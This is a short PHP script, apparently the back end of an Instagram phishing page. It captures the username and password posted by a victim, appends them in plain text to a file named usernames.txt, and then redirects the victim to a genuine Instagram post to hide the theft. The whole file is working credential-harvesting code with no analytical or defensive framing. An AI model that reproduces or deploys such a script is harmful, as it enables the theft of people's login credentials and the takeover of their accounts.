<?php

file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/p/B1junLYlNFqqAIJyVqAId7ZKWKKSAFaacQM3EI0/');
exit();
